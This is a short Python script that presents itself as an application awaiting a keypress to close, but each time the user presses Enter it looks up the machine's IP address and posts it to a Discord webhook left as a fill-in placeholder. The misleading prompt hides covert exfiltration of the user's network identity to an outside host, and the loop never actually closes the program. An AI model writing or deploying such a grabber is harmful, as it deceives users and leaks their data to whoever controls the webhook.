import requests 
import socket 

print("Press Enter to Close Application") 

hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)   

payload_url="YOUR DISCORD WEBHOOK HERE"
while True: 
    message = input() 
    input=(IPAddr) 
    r =requests.post(payload_url, data={"content": IPAddr})
